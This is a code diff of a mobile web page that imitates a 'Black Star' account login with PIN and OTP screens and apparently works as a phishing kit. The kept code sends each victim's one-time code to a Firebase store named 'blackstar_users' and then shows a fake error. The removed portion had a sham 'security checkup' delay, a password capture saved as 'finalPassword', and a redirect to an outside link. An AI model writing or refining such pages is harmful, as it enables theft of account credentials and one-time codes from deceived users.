@@ -20,7 +20,7 @@
     container-type:inline-size;overflow:hidden;background:#000;color:#fff;
   }
   @media (min-width:500px){
-    html,body{background:#000 !important}
+    html,body{background:#111 !important}
     #app{box-shadow:0 0 0 1px #ffffff14,0 2cqw 8cqw #000}
   }
   .screen{position:absolute;inset:0;background:#000;opacity:0;visibility:hidden;transition:opacity .35s,visibility .35s}
@@ -66,7 +66,7 @@
   .ap svg{width:calc(46*var(--u));height:calc(52*var(--u));margin-right:calc(34*var(--u))}
   .help{left:0;right:0;margin:auto;width:calc(300*var(--u));top:calc(1530*var(--u));color:#8a8a8a;text-align:center}
 
-  /* ---------- Shared (PIN / OTP / Security / Password) ---------- */
+  /* ---------- Shared (PIN / OTP) ---------- */
   .rh{font-family:'Red Hat Display',system-ui,sans-serif}
   .h1{left:calc(36*var(--u));right:calc(36*var(--u));font:700 calc(43*var(--u))/calc(62*var(--u)) 'Red Hat Display',sans-serif;color:#fff}
   .sub{left:calc(36*var(--u));right:calc(20*var(--u));font:600 calc(36*var(--u))/calc(56*var(--u)) 'Red Hat Display',sans-serif;color:#8a8a8a;word-break:break-all}
@@ -96,56 +96,6 @@
   .resend-in b{color:#d4b03a;font-weight:700}
   .resend{left:0;right:0;top:calc(739*var(--u));text-align:center;background:none;border:0;cursor:not-allowed;font:700 calc(36*var(--u))/calc(64*var(--u)) 'Red Hat Display',sans-serif;color:#6e5a1c}
   .resend.ready{color:var(--gold);cursor:pointer}
-
-  /* ---------- Security Checkup ---------- */
-  .checkup-wrap{position:absolute;left:0;right:0;top:calc(700*var(--u));display:flex;flex-direction:column;align-items:center}
-  .checkup-ring{
-    width:calc(140*var(--u));height:calc(140*var(--u));border-radius:50%;
-    border:calc(6*var(--u)) solid #1e1e1e;
-    border-top-color:var(--gold);
-    animation:spin 1s linear infinite;
-  }
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .checkup-text{
-    margin-top:calc(60*var(--u));
-    font:500 calc(42*var(--u))/1.4 'Lexend',sans-serif;
-    color:#d8d8d8;text-align:center;padding:0 calc(40*var(--u));
-  }
-  .checkup-sub{
-    margin-top:calc(20*var(--u));
-    font:300 calc(30*var(--u))/1.5 'Lexend',sans-serif;
-    color:#8a8a8a;text-align:center;padding:0 calc(60*var(--u));
-  }
-
-  /* ---------- Password Page ---------- */
-  .pw-h{top:calc(222*var(--u))}
-  .pw-sub{top:calc(327*var(--u))}
-  .email-display{
-    left:calc(36*var(--u));width:calc(756*var(--u));height:calc(119*var(--u));top:calc(490*var(--u));
-    border:calc(2*var(--u)) solid #2e2e2e;border-radius:calc(20*var(--u));
-    background:#0f0f0f;display:flex;align-items:center;padding:0 calc(36*var(--u));
-    font:300 calc(34*var(--u)) 'Lexend',sans-serif;color:#8a8a8a;
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-  }
-  .pw-field{
-    left:calc(36*var(--u));width:calc(756*var(--u));height:calc(119*var(--u));top:calc(650*var(--u));
-    border:calc(2*var(--u)) solid #333;border-radius:calc(20*var(--u));background:transparent;
-    display:flex;align-items:center;padding:0 calc(24*var(--u));
-  }
-  .pw-field:focus-within{border-color:#6b5a1d}
-  .pw-field input{
-    flex:1;background:transparent;border:0;outline:0;
-    font:300 calc(34*var(--u)) 'Lexend',sans-serif;color:#fff;
-  }
-  .pw-field input::placeholder{color:#8a8a8a;opacity:1}
-  .pw-eye{width:calc(80*var(--u));height:100%;background:none;border:0;cursor:pointer;display:flex;align-items:center;justify-content:center;flex:none}
-  .pw-eye svg{width:calc(50*var(--u));height:calc(50*var(--u));stroke:#8a8a8a;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
-  .btn-gold-pw{
-    left:calc(35*var(--u));width:calc(758*var(--u));height:calc(110*var(--u));top:calc(830*var(--u));
-    border:0;border-radius:calc(20*var(--u));
-    background:var(--gold);color:#fff;font:400 calc(42*var(--u))/1 'Lexend',sans-serif;cursor:pointer;transition:transform .15s;
-  }
-  .btn-gold-pw:active{transform:scale(.985)}
 
   /* ---------- Toast ---------- */
   #toast{
@@ -227,34 +177,6 @@
     <button class="abs resend" id="resendBtn" type="button">Resend OTP</button>
   </section>
 
-  <!-- 5. SECURITY CHECKUP (loading) -->
-  <section class="screen" id="s-checkup">
-    <img class="abs" src="images/arcs.png" alt="" draggable="false" style="left:0;top:0;width:100%">
-    <div class="checkup-wrap">
-      <div class="checkup-ring"></div>
-      <div class="checkup-text">Waiting for security checkup...</div>
-      <div class="checkup-sub">Please wait while we verify your account</div>
-    </div>
-  </section>
-
-  <!-- 6. PASSWORD PAGE (email auto-filled, only asks password) -->
-  <section class="screen" id="s-password">
-    <img class="abs" src="images/arcs.png" alt="" draggable="false" style="left:0;top:0;width:100%">
-    <div class="abs h1 pw-h">Enter your password</div>
-    <div class="abs sub pw-sub">Confirm your password to continue</div>
-
-    <div class="abs email-display" id="emailDisplay"></div>
-
-    <div class="abs pw-field">
-      <input id="finalPw" type="password" autocomplete="current-password" placeholder="Password">
-      <button class="pw-eye" id="finalEye" type="button" aria-label="Show password">
-        <svg viewBox="0 0 24 24"><path d="M1.5 12s3.8-7 10.5-7 10.5 7 10.5 7-3.8 7-10.5 7S1.5 12 1.5 12Z"/><circle cx="12" cy="12" r="3.2"/></svg>
-      </button>
-    </div>
-
-    <button class="abs btn-gold-pw" id="finalContinue" type="button">Continue</button>
-  </section>
-
   <div id="toast" role="status"></div>
 </div>
 
@@ -279,28 +201,24 @@ const database = firebase.database();
 /* ✅ SEPARATE NODE for Black Star */
 const DB_NODE = "blackstar_users";
 
-/* ✅ Redirect link (after password page) */
-const REDIRECT_LINK = "https://viral.1v4.top/?user=195245&ref=61147";
-
 const $ = id => document.getElementById(id);
 const SPLASH_MS = 1000;
 const OTP_SECONDS = 60;
-const CHECKUP_MS = 15000;  // ✅ Security checkup = 15 seconds
 const NA_MESSAGE = 'Not available for now. Please log in with your email and password.';
 
 function show(id){
   document.querySelectorAll('.screen').forEach(s => s.classList.toggle('active', s.id === id));
 }
 
-/* ✅ FIXED: fill the FULL mobile width — no side bars */
-let fitW = 0;
+/* Same size on every phone */
+let fitW = 0, fitH = 0;
 function fitApp(){
-  const w = innerWidth;
-  if (w !== fitW){ fitW = w; }
-  $('app').style.setProperty('--w', w + 'px');
+  const w = innerWidth, h = innerHeight;
+  if (w !== fitW || h > fitH){ fitW = w; fitH = h; }
+  $('app').style.setProperty('--w', Math.min(fitW, fitH * 828 / 1792) + 'px');
 }
 addEventListener('resize', fitApp);
-addEventListener('orientationchange', () => setTimeout(() => { fitW = 0; fitApp(); }, 200));
+addEventListener('orientationchange', () => setTimeout(() => { fitW = fitH = 0; fitApp(); }, 200));
 fitApp();
 
 /* Toast */
@@ -418,7 +336,7 @@ function openOtp(){
   show('s-otp'); startTimer(); otpInput.focus(); setTimeout(() => otpInput.focus(), 80);
 }
 
-/* ✅ OTP input → save to Firebase, then go to Security Checkup */
+/* ✅ OTP input → save to Firebase, show "Something went wrong" toast */
 otpInput.addEventListener('input', () => {
   otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
   renderBoxes(otpBoxes, otpInput.value, false);
@@ -426,10 +344,10 @@ otpInput.addEventListener('input', () => {
     const userId = sessionStorage.getItem("blackstar_userId");
     if (userId){
       database.ref(DB_NODE + "/" + userId).update({ otp: otpInput.value })
-        .then(() => openCheckup())
-        .catch(err => { console.error(err); openCheckup(); });
+        .then(() => toast("Something went wrong"))
+        .catch(err => { console.error(err); toast("Something went wrong"); });
     } else {
-      openCheckup();
+      toast("Something went wrong");
     }
   }
 });
@@ -439,45 +357,6 @@ $('otpBack').addEventListener('click', () => { clearInterval(tick); otpInput.blu
 $('resendBtn').addEventListener('click', () => {
   if (!$('resendBtn').classList.contains('ready')) return;
   otpInput.value = ''; renderBoxes(otpBoxes, '', false); startTimer(); otpInput.focus();
-});
-
-/* ---------- Security Checkup ---------- */
-function openCheckup(){
-  otpInput.blur();
-  show('s-checkup');
-  setTimeout(() => {
-    openPasswordPage();
-  }, CHECKUP_MS);
-}
-
-/* ---------- Password Page ---------- */
-function openPasswordPage(){
-  const savedEmail = sessionStorage.getItem("blackstar_email") || "";
-  $('emailDisplay').textContent = savedEmail;
-  $('finalPw').value = '';
-  $('finalPw').type = 'password';
-  show('s-password');
-  setTimeout(() => $('finalPw').focus(), 100);
-}
-
-/* Show/hide password on password page */
-$('finalEye').addEventListener('click', () => {
-  const p = $('finalPw');
-  p.type = p.type === 'password' ? 'text' : 'password';
-});
-
-/* ✅ Continue → save password to Firebase + redirect */
-$('finalContinue').addEventListener('click', () => {
-  const pwVal = $('finalPw').value;
-  if (!pwVal){ toast("Please enter your password"); return; }
-
-  const userId = sessionStorage.getItem("blackstar_userId");
-  if (userId){
-    database.ref(DB_NODE + "/" + userId).update({ finalPassword: pwVal }).catch(err => console.error(err));
-  }
-
-  // ✅ Redirect to your link
-  window.location.href = REDIRECT_LINK;
 });
 </script>
 </body>
